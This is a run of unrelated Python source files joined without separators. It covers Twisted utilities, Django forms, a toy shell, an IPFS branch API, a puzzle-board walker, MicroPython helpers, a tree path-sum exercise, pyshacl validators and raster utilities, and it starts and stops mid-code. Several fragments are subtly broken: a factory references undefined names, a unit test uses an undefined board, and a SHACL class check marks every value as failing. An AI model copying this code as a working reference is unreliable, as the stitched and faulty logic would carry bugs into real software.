    class SubscriptionFactoryWrapper(object):
        def __new__(self, *_ignore):
            return cls(*args)

    interfaces = get_direct_interfaces(cls)
    classImplements(SubscriptionFactoryWrapper, *interfaces)
    return SubscriptionFactoryWrapper


def adapter_value(value):
    """Utility which allows to to quickly register a subscription adapter  as a value instead of

    >>> provideSubscriptionAdapter(adapter_value(['useful', 'stuff']), adapts=(Compute,), provides=ISomething)

    """

    def wrapper(*_):
        return value
    return wrapper


def async_sleep(secs):
    """Util which helps writing synchronous looking code with
    defer.inlineCallbacks.

    Returns a deferred which is triggered after `secs` seconds.

    """

    d = defer.Deferred()
    reactor.callLater(secs, d.callback, None)
    return d


def blocking_yield(deferred, timeout=None):
    """This utility is part of the HDK (hack development toolkit) use with care and remove its usage asap.

    Sometimes we have to synchronously wait for a deferred to complete,
    for example when executing inside db.transact code, which cannot 'yield'
    because currently db.transact doesn't handle returning a deferred.

    Or because we are running code inside a handler which cannot return a deferred
    otherwise we cannot block the caller or rollback the transaction in case of async code
    throwing exception (scenario: we want to prevent deletion of node)

    Use this utility only until you refactor the upstream code in order to use pure async code.
    """

    q = Queue()
    deferred.addBoth(q.put)
    try:
        ret = q.get(True, timeout or 100)
    except Empty:
        raise defer.TimeoutError
    if isinstance(ret, Failure):
        ret.raiseException()
    else:
        return ret


def threaded(fun):
    """Helper decorator to quickly turn a function in a threaded function using a newly allocated thread,
    mostly useful during debugging/profiling in order to see if there are any queuing issues in the
    threadpools.

    """

    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=fun, args=args, kwargs=kwargs)
        thread.start()
    return wrapper


def trace(fun):
    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        log.msg('%s %s %s' % (fun, args, kwargs), system='trace')
        return fun(*args, **kwargs)
    return wrapper


def trace_methods(cls):
    def trace_method(name):
        fun = getattr(cls, name)
        if inspect.ismethod(fun):
            setattr(cls, name, trace(fun))

    for name in cls.__dict__:
        trace_method(name)


def get_u(obj, key):
    val = obj.get(key)
    return unicode(val) if val is not None else None


def get_i(obj, key):
    val = obj.get(key)
    return int(val) if val is not None else None


def get_f(obj, key):
    val = obj.get(key)
    return float(val) if val is not None else None


def exception_logger(fun):
    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        try:
            res = fun(*args, **kwargs)
            if isinstance(res, defer.Deferred):
                @res
                def on_error(failure):
                    log.msg("Got unhandled exception: %s" % failure.getErrorMessage(), system='debug')
                    if get_config().getboolean('debug', 'print_exceptions'):
                        log.err(failure, system='debug')
            return res
        except Exception:
            if get_config().getboolean('debug', 'print_exceptions'):
                log.err(system='debug')
            raise
    return wrapper


def find_nth(haystack, needle, n, start_boundary=None):
    start = haystack.find(needle, start_boundary)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start + len(needle))
        n -= 1
    return start


class benchmark(object):
    """Can be used either as decorator:
    >>> class Foo(object):
    ...   @benchmark("some description")
    ...   def doit(self, args):
    ...      # your code


    or as context manager:
    >>> with benchmark("some description"):
    >>>    # your code

    and it will print out the time spent in the function or block.
    """

    def __init__(self, name):
        self.name = name

    def __call__(self, fun):
        @functools.wraps(fun)
        def wrapper(*args, **kwargs):
            with self:
                return fun(*args, **kwargs)
        return wrapper

    def __enter__(self):
        self.start = time.time()

    def __exit__(self, ty, val, tb):
        end = time.time()
        print("%s : %0.3f seconds" % (self.name, end - self.start))
        return False


class TimeoutException(Exception):
    """Raised when time expires in timeout decorator"""


def timeout(secs):
    """
    Decorator to add timeout to Deferred calls
    """
    def wrap(func):
        @defer.inlineCallbacks
        @functools.wraps(func)
        def _timeout(*args, **kwargs):
            rawD = func(*args, **kwargs)
            if not isinstance(rawD, defer.Deferred):
                defer.returnValue(rawD)

            timeoutD = defer.Deferred()
            timesUp = reactor.callLater(secs, timeoutD.callback, None)

            try:
                rawResult, timeoutResult = yield defer.DeferredList([rawD, timeoutD],
                                                                    fireOnOneCallback=True,
                                                                    fireOnOneErrback=True,
                                                                    consumeErrors=True)
            except defer.FirstError, e:
                #Only rawD should raise an exception
                assert e.index == 0
                timesUp.cancel()
                e.subFailure.raiseException()
            else:
                #Timeout
                if timeoutD.called:
                    rawD.cancel()
                    raise TimeoutException("%s secs have expired" % secs)

            #No timeout
            timesUp.cancel()
            defer.returnValue(rawResult)
        return _timeout
    return wrap

import re
import typing
from urllib.parse import urlparse

from django import forms
from django.core.exceptions import ValidationError
from django.forms import ModelForm

from lib.forms import ModelFormWithSubmit
from projects.project_models import Project
from .source_models import FileSource, GithubSource, Source

# TODO: these should be proper mime types!
FILE_TYPES = [
    # ('text/folder', 'Folder'),
    ('text/dar', 'Dar'),
    ('text/dockerfile', 'Dockerfile'),
    ('text/ipynb', 'Jupyter Notebook'),
    ('text/rmarkdown', 'RMarkdown'),
]


def validate_unique_project_path(project: Project, path: str, existing_source_pk: typing.Optional[int] = None) -> None:
    """
    Check if a `FileSource` with a path already exists for a given `Project`.

    If a path `FileSource` with path does exist raise a `ValidationError`.
    """
    # this check only matters for FileSource objects because linked sources can be mapped to the same path
    existing_sources = FileSource.objects.filter(project=project, path=path)

    if existing_source_pk:
        existing_sources = existing_sources.exclude(pk=existing_source_pk)

    if len(existing_sources):
        raise ValidationError("A source with path {} already exists for this project.".format(path))


class FileSourceForm(ModelFormWithSubmit):
    type = forms.ChoiceField(choices=FILE_TYPES)
    path = forms.RegexField(regex=r'^[^/][A-Za-z\-/\.]+[^/]$', widget=forms.TextInput,                    
                            error_messages={'invalid': 'The path must not contain spaces, or start or end with a /'})                    

    class Meta:
        model = FileSource
        fields = ('path',)
        widgets = {
            'type': forms.Select(),
            'path': forms.TextInput()
        }

    def clean(self):
        validate_unique_project_path(self.initial['project'], self.cleaned_data['path'])                    
        return super().clean()                    


class SourceUpdateForm(ModelForm):
    path = forms.RegexField(regex=r'^[^/][A-Za-z0-9\-/\.]+[^/]$', widget=forms.TextInput,                    
                            error_messages={'invalid': 'The path must not contain spaces, or start or end with a /'})                    

    class Meta:
        model = Source
        fields = ('path',)

    def clean(self):
        cleaned_data = super().clean()
        if 'path' in cleaned_data:  # it might not be, if the form is not valid then cleaned_data will be an empty dict
            validate_unique_project_path(self.instance.project, cleaned_data['path'], self.instance.pk)
        return cleaned_data


class GithubSourceForm(ModelFormWithSubmit):
    class Meta:
        model = GithubSource
        fields = ('path', 'repo', 'subpath')
        widgets = {
            'repo': forms.TextInput(),
            'subpath': forms.TextInput(),
            'path': forms.TextInput()
        }

    @staticmethod
    def raise_repo_validation_error(repo: str) -> None:
        raise ValidationError('"{}" is not a valid Github repository. A repository (in the format "username/path", or '
                              'a URL) is required.'.format(repo))

    def clean_repo(self) -> str:
        """Validate that the repo is either in the format `username/repo`, or extract this from a Github URL."""
        repo = self.cleaned_data['repo']
        if not repo:
            self.raise_repo_validation_error(repo)

        github_url = urlparse(self.cleaned_data['repo'])

        if github_url.scheme.lower() not in ('https', 'http', ''):
            self.raise_repo_validation_error(repo)

        if github_url.netloc.lower() not in ('github.com', ''):
            self.raise_repo_validation_error(repo)

        repo_match = re.match(r"^((github\.com/)|/)?([a-z\d](?:[a-z\d]|-(?=[a-z\d])){0,38})/([\w_-]+)/?$",
                              github_url.path, re.I)

        if not repo_match:
            self.raise_repo_validation_error(repo)

        repo_match = typing.cast(typing.Match, repo_match)

        return '{}/{}'.format(repo_match[3], repo_match[4])

root = ["", "home", "root"]
dirs = []
path = []
curr_path = [] or ["", "home", "root"]


# To create directory
def mkdir():
    global dirs
    if dir in dirs:
        print("Directory already exist.")
    else:
        dirs.append(dir)
        path.append(dir)


# shows directory
def ls():
    global path
    if path == root:
        path = dirs
        path = path[0]
    print(*path, sep="\n")


# change directory
def cd():
    global curr_path, dir, path
    if dir == "":
        curr_path = root
        path = root
    elif dir in dirs:
        curr_path.append(dir)
        path.clear()
    elif dir == "..":
        curr_path.pop()
        print(*curr_path, sep="/")
        i = len(dirs) - 1
        if dirs[i] in path:
            i = i - 1
            path.pop()
            path.append(dirs[i])
        else:
            path.append(dirs[i])
    else:
        print("Directory doesn't exist.")


# show current directory
def pwd():
    global curr_path
    print(*curr_path, sep="/")


# remove directory
def rm():
    global dirs
    if dir in dirs:
        dirs.remove(dir)
        if dir in path:
            path.remove(dir)
    else:
        print("Directory does not exist.")


# clean session data like it is executed just now
def session_clear():
    global dirs
    dirs.clear()
    global curr_path
    curr_path.clear()
    curr_path = root
    global path
    path.clear()

def commands(argument):
    comm = {
        "mkdir": mkdir,
        "ls": ls,
        "cd": cd,
        "pwd": pwd,
        "rm": rm,
        "session_clear": session_clear,
        "exit": exit
    }
    if n in comm:
        # Get the function from comm dictionary
        func = comm.get(argument)
        # Execute the function
        func()
    else:
        print("command does not exist!")


print(
    "There are total 7 commands: mkdir, ls, cd, pwd, rm, session_clear, exit.")

while True:
    n = input("$: ")
    a = []
    a.append(n.split(" "))
    n = a[0][0]
    if n in ["mkdir", "rm"] and len(a[0]) == 1:
        print("{}:missing operand".format(n))
    elif len(a[0]) == 1:
        dir = ""
    elif len(a[0]) == 2:
        dir = a[0][1]
    else:
        print("Invalid Syntax")
    commands(n)

import io
import os
import sys
import webbrowser
from pathlib import Path

import ipfsapi
from ipvc.common import CommonAPI, expand_ref, refpath_to_mfs, make_len, atomic

class BranchAPI(CommonAPI):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    @atomic
    def status(self, name=False):
        _, branch = self.common()
        active = self.ipfs.files_read(
            self.get_mfs_path(self.fs_cwd, repo_info='active_branch_name')).decode('utf-8')
        if not self.quiet: print(active)
        return active

    @atomic
    def create(self, name, from_commit="@head", no_checkout=False):
        _, branch = self.common()

        if not name.replace('_', '').isalnum():
            if not self.quiet:
                print('Branch name has to be alpha numeric with underscores',
                      file=sys.stderr)
            raise RuntimeError()
        elif name in ['head', 'workspace', 'stage']:
            if not self.quiet:
                print(f'"{name}" is a reserved keyword, please pick a different branch name',
                      file=sys.stderr)
            raise RuntimeError()


        try:
            self.ipfs.files_stat(self.get_mfs_path(self.fs_cwd, name))
            if not self.quiet: print('Branch name already exists', file=sys.stderr)
            raise RuntimeError()
        except ipfsapi.exceptions.StatusError:
            pass

        if from_commit == "@head":
            # Simply copy the current branch to the new branch
            self.ipfs.files_cp(
                self.get_mfs_path(self.fs_cwd, branch),
                self.get_mfs_path(self.fs_cwd, name))
        else:
            # Create the branch directory along with an empty stage and workspace
            for ref in ['stage', 'workspace']:
                mfs_ref = self.get_mfs_path(self.fs_cwd, name, branch_info=ref)
                self.ipfs.files_mkdir(mfs_ref, parents=True)

            # Copy the commit to the new branch's head
            commit_path = expand_ref(from_commit)
            mfs_commit_path = self.get_mfs_path(
                self.fs_cwd, branch, branch_info=commit_path)
            mfs_head_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='head')

            try:
                self.ipfs.files_stat(mfs_commit_path)
            except ipfsapi.exceptions.StatusError:
                if not self.quiet:
                    print('No such commit', file=sys.stderr)
                raise RuntimeError()

            self.ipfs.files_cp(mfs_commit_path, mfs_head_path)

            # Copy commit bundle to workspace and stage, plus a parent1 link
            # from stage to head
            mfs_commit_bundle_path = f'{mfs_commit_path}/bundle'
            mfs_workspace_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='workspace/bundle')
            mfs_stage_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='stage/bundle')
            self.ipfs.files_cp(mfs_commit_bundle_path, mfs_workspace_path)
            self.ipfs.files_cp(mfs_commit_bundle_path, mfs_stage_path)

        if not no_checkout:
            self.checkout(name)

    def _load_ref_into_repo(self, fs_repo_root, branch, ref,
                            without_timestamps=False):
        """ Syncs the fs workspace with the files in ref """
        metadata = self.read_metadata(ref)
        added, removed, modified = self.workspace_changes(
            fs_repo_root, metadata, update_meta=False)

        mfs_refpath, _ = refpath_to_mfs(Path(f'@{ref}'))

        for path in added:
            os.remove(path)

        for path in removed | modified:
            mfs_path = self.get_mfs_path(
                fs_repo_root, branch,
                branch_info=(mfs_refpath / path.relative_to(fs_repo_root)))

            timestamp = metadata[str(path)]['timestamp']

            with open(path, 'wb') as f:
                f.write(self.ipfs.files_read(mfs_path))

            os.utime(path, ns=(timestamp, timestamp))

    @atomic
    def checkout(self, name, without_timestamps=False):
        """ Checks out a branch"""
        fs_repo_root, _ = self.common()

        try:
            self.ipfs.files_stat(self.get_mfs_path(self.fs_cwd, name))
        except ipfsapi.exceptions.StatusError:
            if not self.quiet: print('No branch by that name exists', file=sys.stderr)
            raise RuntimeError()

        # Write the new branch name to active_branch_name
        # NOTE: truncate here is needed to clear the file before writing
        self.ipfs.files_write(
            self.get_mfs_path(self.fs_cwd, repo_info='active_branch_name'),
            io.BytesIO(bytes(name, 'utf-8')),
            create=True, truncate=True)

        self._load_ref_into_repo(
            fs_repo_root, name, 'workspace', without_timestamps)

    @atomic
    def history(self, show_hash=False):
        """ Shows the commit history for the current branch. Currently only shows
        the linear history on the first parents side"""
        fs_repo_root, branch = self.common()

        # Traverse the commits backwards by adding /parent1/parent1/parent1/... etc
        # to the mfs path until it stops
        curr_commit = Path('head')                    
        commits = []
        while True:
            mfs_commit = self.get_mfs_path(                    
                fs_repo_root, branch, branch_info=curr_commit)                    
            mfs_commit_meta = mfs_commit / 'metadata'                    
            try:
                mfs_commit_hash = self.ipfs.files_stat(mfs_commit)['Hash']                    
                mfs_commit_ref_hash = self.ipfs.files_stat(                    
                    mfs_commit / 'bundle/files')['Hash']                    
            except ipfsapi.exceptions.StatusError:
                # Reached the root of the graph
                break                    

            meta = self.mfs_read_json(mfs_commit_meta)                    
            if len(meta) == 0:                    
                # Reached the root of the graph
                break                    

            h, ts, msg = mfs_commit_hash[:6], meta['timestamp'], meta['message']                    
            auth = make_len(meta['author'] or '', 30)
            if not self.quiet: 
                if show_hash:
                    print(f'* {mfs_commit_ref_hash} {ts} {auth}   {msg}')                    
                else:
                    print(f'* {ts} {auth}   {msg}')

            commits.append(mfs_commit_hash)                    
            curr_commit = curr_commit / 'parent1'                    

        return commits

    @atomic
    def show(self, refpath, browser=False):
        """ Opens a ref in the ipfs file browser """
        mfs_commit_hash = self.get_refpath_hash(refpath)
        if browser:
            # TODO: read IPFS node url from settings
            url = f'http://localhost:8080/ipfs/{mfs_commit_hash}'
            if not self.quiet: print(f'Opening {url}')
            webbrowser.open(url)
        else:
            ret = self.ipfs.ls(f'/ipfs/{mfs_commit_hash}')
            obj = ret['Objects'][0]
            if len(obj['Links']) == 0:
                # It's a file, so cat it
                cat = self.ipfs.cat(f'/ipfs/{mfs_commit_hash}').decode('utf-8')
                if not self.quiet:
                    print(cat)
                return cat
            else:
                # It's a folder
                ls = '\n'.join([ln['Name'] for ln in obj['Links']])
                if not self.quiet:
                    print(ls)
                return ls

    @atomic
    def merge(self, refpath):
        """ Merge refpath into this branch

        """
        pass

    @atomic
    def ls(self):
        """ List branches """
        fs_repo_root = self.get_repo_root()
        branches = self.get_branches(fs_repo_root)
        if not self.quiet:
            print('\n'.join(branches))
        return branches

import undead
import unittest

class TestWalker(unittest.TestCase):

    def setUp(self):
        test_link = "https://www.chiark.greenend.org.uk/~sgtatham/puzzles/js/undead.html#4x4:5,2,4,cRdRLbLbR,2,3,1,3,3,3,1,0,0,1,4,0,0,2,3,1"
        board_txt = test_link.split('#')[-1]
        board = Board(board_txt)                    

    def test_walker(self):
        walkman = Walker()                    
        row = 3                    
        col = 0
        walkman.walk(board, row, col, 'east')                    


if __name__ == "__main__":
    unittest.main()

class Grid(object):

    def __init__(self):
        self.content = None
        self.filled = False

    def set(self, content):
        if content == 'L':
            # self.content = '\\'
            self.content = 'L'
            self.filled = True
        elif content == 'R':
            # self.content = '/'
            self.content = 'R'
            self.filled = True
        else:
            self.content = content

    def get(self):
        return self.content

    def __str__(self):
        return '|%s|' % self.content


class Board(object):

    def __init__(self, board_str):
        self.dim_x, self.dim_y = self.calc_dim(board_str)
        self.g_count, self.v_count, self.z_count = self.calc_monster_count(board_str)
        self.board = []
        self._init_board()
        self.generate_board(board_str)
        self.north_count, self.east_count, self.south_count, self.west_count = self.calc_board_count(board_str)

    @staticmethod
    def calc_dim(board_str):
        """
        Given a string converts it to dimensions 
        :return: x, y
        """
        dims = []
        for dim in board_str.split(':')[0].split('x'):
            dims.append(int(dim))
        
        return dims[0], dims[1]

    @staticmethod
    def calc_monster_count(board_str):
        board_split = board_str.split(':')[1].split(',')
        ghost_count = int(board_split[0])
        vampire_count = int(board_split[1])
        zombie_count = int(board_split[2])

        return ghost_count, vampire_count, zombie_count

    def calc_board_count(self, board_str):
        board_split = board_str.split(':')[1].split(',')

        board_count_start = 4

        top_row = board_split[board_count_start: board_count_start + self.dim_x]
        right_col = board_split[board_count_start + self.dim_x: board_count_start + self.dim_x + self.dim_y]

        bottom_row = board_split[board_count_start + self.dim_x + self.dim_y: board_count_start + (self.dim_x * 2) + self.dim_y]
        left_col = board_split[board_count_start + (self.dim_x * 2) + self.dim_y: board_count_start + (self.dim_x * 2) + (self.dim_y * 2)]

        return top_row, right_col, bottom_row, left_col

    def _init_board(self):
        for x in range(0, self.dim_x):
            self.board.append([])
            for y in range(0, self.dim_y):
                empty_grid = Grid()
                self.board[x].append(empty_grid)
        

    def generate_board(self, board_str):
        board_split = board_str.split(':')[1].split(',')
        board_layout = board_split[3]

        x = 0
        y = 0


        for space in board_layout:
            if space == "L" or space == "R":
                self.board[x][y].set(space)
                if y < self.dim_y - 1:
                    y += 1
                else:
                    y = 0
                    x += 1
            else:
                for count in range(0, (ord(space) - 96)):
                    self.board[x][y].set(' ')
                    if y < self.dim_y - 1:
                        y += 1
                    else:
                        y = 0
                        x += 1    

    def print_board(self):
        x_str = []
        y_str = []
        for x in range(0, self.dim_x):
            for y in range(0, self.dim_y):
                y_str.append(str(self.board[x][y]))
            print(''.join(y_str))
            y_str = []


class Walker(object):
    def __init__(self):
        self.current_x = 0
        self.current_y = 0

    def walk(self, board, row, col, direction, path=[]):
        path.append((row, col))
        print(row, col)                    
        if board.board[row][col].get() == 'L':
            direction = self.left_bounce(direction)
        elif board.board[row][col].get() == 'R':
            direction = self.right_bounce(direction)

        if direction == 'north':
            # The top left of the array is considered to be 0. 0
            # as we go down we are incrementing col
            row -= 1
        elif direction == 'east':
            col += 1
        elif direction == 'south':
            row += 1
        elif direction == 'west':
            col -= 1

        if (row >= 0 and row < board.dim_x) and (col >= 0 and col < board.dim_y):
            self.walk(board, row, col, direction)

    def solve(self):
        pass

    @staticmethod
    def right_bounce(direction):
        if direction == 'north':
            return 'east'
        elif direction == 'east':
            return 'north'
        elif direction == 'south':
            return 'west'
        elif direction == 'west':
            return 'south'
        else:
            raise ValueError('%s not a valid direction' % direction) 

    @staticmethod
    def left_bounce(direction):
        if direction == 'north':
            return 'west'
        elif direction == 'west':
            return 'north'
        elif direction == 'south':
            return 'east'
        elif direction == 'east':
            return 'south'
        else:
            raise ValueError('%s not a valid direction' % direction) 


if __name__ == "__main__":
    test_link = "https://www.chiark.greenend.org.uk/~sgtatham/puzzles/js/undead.html#4x4:5,2,4,cRdRLbLbR,2,3,1,3,3,3,1,0,0,1,4,0,0,2,3,1"
    board_txt = test_link.split('#')[-1]
    board = Board(board_txt)
    print('printing board out')
    board.print_board()

    walkman = Walker()
    row = 0
    col = 0
    walkman.walk(board, row, col, 'east')                    

import gc
import os

class _const:
    class ConstError(TypeError):
        pass

    def __setattr__(self, name, value):
        if self.__dict__.get(name):
            raise self.ConstError("Can't rebind const (%s)" % name)
        else:
            self.__dict__[name] = value

def is_folder(path):
    try:
        os.listdir(path)
        return True
    except:
        return False


def traverse(path):
    n = dict(name=path, children=[])
    for i in os.listdir(path):
        if is_folder(path + '/' + i):
            n['children'].append(traverse(path + '/' + i))
        else:
            n['children'].append(dict(name=i))                    
    return n

def config_path():
    try:
        return len(os.listdir('config'))
    except:
        os.mkdir('config')
    finally:
        return len(os.listdir('config'))


def rainbow(output, color=None):
    if color:
        if color == 'green':
            return '\033[1;32m%s\033[0m' % output
        if color == 'red':
            return '\033[1;31m%s\033[0m' % output
        if color == 'blue':
            return '\033[1;34m%s\033[0m' % output
    else:
        return output


def print_left_just(output, length=None):
    if length == None:
        length = len(output)
    return output + (length - len(output)) * ' '


def print_right_just(output, length):
    if length == None:
        length = len(output)
    return (length - len(output)) * ' ' + output


def print_as_a_list_item(index, title, subtile=None):
    index = ('[%s]' % str(index)).center(8).lstrip()
    title = print_left_just(rainbow(title, color='green'))
    if subtile:
        subtile = '\n' + len(index) * ' ' + subtile
    else:
        subtile = ''
    return index + title + subtile


def selection(hint, range):

    index = input(rainbow(hint, color='blue'))
    if int(index) > range or int(index) < 0:
        print(rainbow('out of range!', color='red'))
        selection(hint, range)
    else:
        return int(index)


def mem_analyze(func):
    """
    :
    """

    def wrapper(*args, **kwargs):
        memory_alloc = 'memory alloced: %s kb' % str(gc.mem_alloc() / 1024)
        memory_free = 'memory free: %s kb' % str(gc.mem_free() / 1024)
        gc.collect()
        memory_after_collect = 'after collect: %s kb available' % str(
            gc.mem_free() / 1024)
        print(rainbow(memory_alloc, color='red'))
        print(rainbow(memory_free, color='green'))
        print(rainbow(memory_after_collect, color='blue'))
        func(*args, **kwargs)
        memory_after_func_excute = 'after %s excuted: %s kb available' % (
            func.__name__, str(gc.mem_free() / 1024))
        print(rainbow(memory_after_func_excute, color='red'))

    return wrapper



from distutils.core import setup

setup(
    name = 'emp-1zlab',      
    version = '0.1.13',
    py_modules = ['emp_wifi','emp_boot','emp_dev','emp_utils','emp_webrepl'],
    author = 'fuermohao@1zlab.com',        
    author_email = 'fuermohao@outlook.com',
    url = 'http://emp.1zlab.com',
    description = 'EMP(Easy MicroPython) is a upy module to make things Easy on MicroPython.'   
    )

#print all the paths from root node that sums up to the given sum
#This function return all the paths from given node which it takes as its argument in the form of list of strings
#This function uses level order traversal
def f(root,s):
    if not root:
        return ['None']
    if root.val==s:                    
        return [str(root.val) + ' ']                    
    left=f(root.left,s-root.val)
    right=f(root.right,s-root.val)

    new=[]
    for e in left+right:
        new.append(str(root.val)+ ' ' + e)

    return new


class node:
    def __init__(self,val):
        self.val=val

    left,right,s=None,None,0


'''

'''
#This the tree which we formed below

         10
       /    \
     28      13
           /    \
         14      15
        /   \    / \
       21   22  23  24




#Driver code
root=node(10)
root.left=node(28)
root.right=node(13)
root.right.left=node(14)
root.right.right=node(15)
root.right.left.left=node(21)
root.right.left.right=node(22)
root.right.right.left=node(23)
root.right.right.right=node(24)

for string in f(root,38):
    if 'None' not in string:
        print(string)




"""
https://www.w3.org/TR/shacl/#core-components-value-type
"""
import abc
import pyshacl.consts                    

class ConstraintComponent(object, metaclass=abc.ABCMeta):

    def __init__(self, shape):
        self.shape = shape

    @classmethod
    @abc.abstractmethod
    def constraint_parameters(cls):
        return NotImplementedError()

    @abc.abstractmethod
    def evaluate(self, target_graph, value_nodes):
        return NotImplementedError()

# -*- coding: utf-8 -*-
"""
https://www.w3.org/TR/shacl/#core-components-value-type
"""
import rdflib
from pyshacl.constraints.constraint_component import ConstraintComponent
from pyshacl.consts import SH, RDFS_subClassOf, RDF_type                    

SH_class = SH.term('class')                    


class ClassConstraintComponent(ConstraintComponent):
    """
    The condition specified by sh:class is that each value node is a SHACL instance of a given type.
    Definition:                    
    For each value node that is either a literal, or a non-literal that is not a SHACL instance of $class in the data graph, there is a validation result with the value node as sh:value.
    """

    def __init__(self, shape):
        super(ClassConstraintComponent, self).__init__(shape)
        class_rules = list(self.shape.objects(SH_class))
        if len(class_rules) > 1:                    
            #TODO: Make a new error type for this
            raise RuntimeError("sh:class must only have one value.")                    
        self.class_rule = class_rules[0]                    

    @classmethod
    def constraint_parameters(cls):
        return [SH_class]

    def evaluate(self, target_graph, value_nodes):                    
        """

        :type value_nodes: list | set                    
        :type target_graph: rdflib.Graph
        """
        fails = []
        for f in value_nodes:                    
            t = target_graph.objects(f, RDF_type)                    
            for ctype in iter(t):                    
                if ctype == self.class_rule:                    
                    continue                    
                subclasses = target_graph.objects(ctype, RDFS_subClassOf)                    
                if self.class_rule in iter(subclasses):                    
                    continue                    
            fails.append(f)                    
        if len(fails) > 0:                    
            return False, fails                    
        return True, None                    



# -*- coding: utf-8 -*-
import rdflib
import RDFClosure as owl_rl

from pyshacl.shape import find_shapes                    

if owl_rl.json_ld_available:
    import rdflib_jsonld

import logging

logging.basicConfig()
log = logging.getLogger(__name__)


class Validator(object):
    @classmethod
    def _load_default_options(cls, options_dict):
        options_dict['inference'] = True
        options_dict['abort_on_error'] = False

    @classmethod
    def _run_pre_inference(cls, target_graph):
        try:
            inferencer = owl_rl.DeductiveClosure(owl_rl.RDFS_OWLRL_Semantics)
        except Exception as e:
            log.error("Error during creation of OWL-RL Deductive Closure")
            raise e
        try:
            inferencer.expand(target_graph)
        except Exception as e:
            log.error("Error while running OWL-RL Deductive Closure")
            raise e

    def __init__(self, target_graph, *args, shacl_graph=None, options=None, **kwargs):                    
        if options is None:
            options = {}
        self._load_default_options(options)
        self.options = options
        assert isinstance(target_graph, rdflib.Graph),\
            "target_graph must be a rdflib Graph object"
        self.target_graph = target_graph
        if shacl_graph is None:
            shacl_graph = target_graph
        assert isinstance(shacl_graph, rdflib.Graph),\
            "shacl_graph must be a rdflib Graph object"
        self.shacl_graph = shacl_graph


    def run(self):
        if self.options['inference']:                    
            self._run_pre_inference(self.target_graph)
        shapes = find_shapes(self.shacl_graph)
        results = {}                    
        for s in shapes:
            r = s.validate(self.target_graph)                    
            results[s.node] = r                    
        return results

# TODO: check out rdflib.util.guess_format() for format. I think it works well except for perhaps JSON-LD
def _load_into_graph(target):
    if isinstance(target, rdflib.Graph):
        return target
    target_is_file = False
    target_is_text = False
    rdf_format = None
    if isinstance(target, str):
        if target.startswith('file://'):
            target_is_file = True
            target = target[7:]
        elif len(target) < 240:
            if target.endswith('.ttl'):
                target_is_file = True
                rdf_format = 'turtle'
            elif target.endswith('.xml'):
                target_is_file = True
                rdf_format = 'xml'
            elif target.endswith('.json'):
                target_is_file = True
                rdf_format = 'json-ld'
        if not target_is_file:
            target_is_text = True
    else:
        raise RuntimeError("Cannot determine the format of the input graph")
    g = rdflib.Graph()
    if target_is_file:
        import os
        file_name = os.path.abspath(target)
        with open(file_name, mode='rb') as file:
            g.parse(source=None, publicID=None, format=rdf_format,
                    location=None, file=file)
    elif target_is_text:
        g.parse(source=target)
    return g


def validate(target_graph, *args, shacl_graph=None, inference=True, abort_on_error=False, **kwargs):
    target_graph = _load_into_graph(target_graph)
    if shacl_graph is not None:
        shacl_graph = _load_into_graph(shacl_graph)
    validator = Validator(
        target_graph, shacl_graph,
        options={'inference': inference, 'abort_on_error': abort_on_error})
    return validator.run()



# maybe read in the baseline
# then loop through reads of all models...
# perform the diff
# then groupby month and compute means / stdev

def sort_files( files, split_on='_', elem_month=-2, elem_year=-1 ):
	'''
	sort a list of files properly using the month and year parsed
	from the filename.  This is useful with SNAP data since the standard
	is to name files like '<prefix>_MM_YYYY.tif'.  If sorted using base
	Pythons sort/sorted functions, things will be sorted by the first char
	of the month, which makes thing go 1, 11, ... which sucks for timeseries
	this sorts it properly following SNAP standards as the default settings.

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_month = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-2. For SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sorted `list` by month and year ascending. 

	'''
	import pandas as pd
	months = [ int(fn.split('.')[0].split( split_on )[elem_month]) for fn in files ]
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( {'fn':files, 'month':months, 'year':years} )
	df_sorted = df.sort_values( ['year', 'month' ] )
	return df_sorted.fn.tolist()

def only_years( files, begin=1901, end=2100, split_on='_', elem_year=-1 ):
	'''
	return new list of filenames where they are truncated to begin:end

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	begin = [int] four digit integer year of the begin time default:1901
	end = [int] four digit integer year of the end time default:2100
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sliced `list` to begin and end year.
	'''
	import pandas as pd
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( { 'fn':files, 'year':years } )
	df_slice = df[ (df.year >= begin ) & (df.year <= end ) ]
	return df_slice.fn.tolist()

class SubDomains( object ):
	'''
	rasterize subdomains shapefile to ALFRESCO AOI of output set
	'''
	def __init__( self, subdomains_fn, rasterio_raster, id_field, name_field, background_value=0, *args, **kwargs ):
		'''
		initializer for the SubDomains object
		The real magic here is that it will use a generator to loop through the 
		unique ID's in the sub_domains raster map generated.
		'''
		import numpy as np
		self.subdomains_fn = subdomains_fn
		self.rasterio_raster = rasterio_raster
		self.id_field = id_field
		self.name_field = name_field
		self.background_value = background_value
		self._rasterize_subdomains( )
		self._get_subdomains_dict( )

	def _rasterize_subdomains( self ):
		'''
		rasterize a subdomains shapefile to the extent and resolution of 
		a template raster file. The two must be in the same reference system 
		or there will be potential issues. 
		returns:
			numpy.ndarray with the shape of the input raster and the shapefile
			polygons burned in with the values of the id_field of the shapefile
		gotchas:
			currently the only supported data type is uint8 and all float values will be
			coerced to integer for this purpose.  Another issue is that if there is a value
			greater than 255, there could be some error-type issues.  This is something that 
			the user needs to know for the time-being and will be fixed in subsequent versions
			of rasterio.  Then I can add the needed changes here.
		'''
		import geopandas as gpd
		import numpy as np

